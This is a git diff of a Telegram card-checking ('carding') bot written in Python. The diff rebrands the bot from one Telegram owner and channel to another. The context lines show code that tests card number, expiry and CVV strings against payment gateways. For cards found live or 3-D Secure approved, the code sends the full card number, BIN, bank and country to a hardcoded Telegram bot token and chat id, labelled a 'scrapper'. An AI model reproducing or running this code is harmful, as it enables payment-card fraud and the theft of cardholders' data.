@@ -322,7 +322,7 @@ def menu_callback(call):
 					bot.edit_message_text(chat_id=call.message.chat.id, 
 					  message_id=call.message.message_id, 
 					  text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
-𝘽𝙤𝙩 𝘽𝙮 @lakshayfr''', reply_markup=mes)
+𝘽𝙤𝙩 𝘽𝙮 @Naughtyxd''', reply_markup=mes)
 
 					msg=f'''<b>𝑪𝑯𝑨𝑹𝑮𝑬 ✅
 			- - - - - - - - - - - - - - - - - - - - - - -
@@ -764,7 +764,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @lakshayfr
+◆ 𝑩𝒀: @Naughtyxd
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	msgd=f'''<b>𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌
 			- - - - - - - - - - - - - - - - - - - - - - -
@@ -776,7 +776,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @lakshayfr
+◆ 𝑩𝒀: @Naughtyxd
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'live' in last:
 		tok = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
@@ -830,8 +830,8 @@ def respond_to_vbv(message):
 		BL='𝗙𝗥𝗘𝗘'
 	if BL == '𝗙𝗥𝗘𝗘':
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/lakshayfr")
-		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/hypermpshop")
+		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Naughtyxd")
+		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/naughtycheck")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}
 𝗧𝗛𝗜𝗦 𝗣𝗔𝗥𝗧𝗜𝗖𝗨𝗟𝗔𝗥 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗜𝗦 𝗡𝗢𝗧 𝗙𝗥𝗘𝗘 
@@ -972,7 +972,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ⸙ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
 ⸙ 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
 ⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
-⸙ 𝗕𝗼𝘁 𝗕𝘆: @lakshayfr</b>'''
+⸙ 𝗕𝗼𝘁 𝗕𝘆: @Naughtyxd</b>'''
 	msgd=f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌
 			
 ⸙ 𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
@@ -982,7 +982,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ⸙ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
 ⸙ 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
 ⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
-⸙ 𝗕𝗼𝘁 𝗕𝘆: @lakshayfr</b>'''
+⸙ 𝗕𝗼𝘁 𝗕𝘆: @Naughtyxd</b>'''
 	if "Funds" in last or 'Insufficient Funds' in last or 'avs' in last or '1000: Approved' in last or 'Duplicate' in last or 'Approved' in last:
 		tok = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
 		acc =  '-1002183834948'
@@ -1035,8 +1035,8 @@ def respond_to_vbv(message):
 		BL='𝗙𝗥𝗘𝗘'
 	if BL == '𝗙𝗥𝗘𝗘':
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/lakshayfr")
-		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/hypermpshop")
+		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me//@Naughtyxd")
+		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/naughtycheck")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}
 𝗧𝗛𝗜𝗦 𝗣𝗔𝗥𝗧𝗜𝗖𝗨𝗟𝗔𝗥 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗜𝗦 𝗡𝗢𝗧 𝗙𝗥𝗘𝗘 
@@ -1106,8 +1106,8 @@ MUST JOIN @naughtycheck , ELSE REGRET.
 	required_duration = timedelta(hours=0)
 	if current_time - provided_time > required_duration:
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/lakshayfr")
-		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/hypermpshop")
+		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Naughtyxd")
+		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/naughtycheck")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗢𝗨 𝗖𝗔𝗡𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗</b>
 	''',reply_markup=keyboard)
@@ -1526,7 +1526,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @lakshayfr
+◆ 𝑩𝒀: @Naughtyxd
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	msgd=f'''<b>𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 ❌
 - - - - - - - - - - - - - - - - - - - - - - -
@@ -1538,20 +1538,20 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @lakshayfr
+◆ 𝑩𝒀: @Naughtyxd
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
 		tok = '7371222023:AAHBreBPEWKeoEC3OZYabLBACh5fWbGSsdQ'
 		acc =  '-1002183834948'
 		mg = f"""<b> 
-❆═══lakshay 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
+❆═══NAUGHTY 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
 ❆═══𝙸𝙽𝙵𝙾═══❆
 ｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
 ｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
 ｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ <code>{country} - {country_flag}</code>
-❆═══LAKSHAY 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
+❆═══NAUGHTY 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
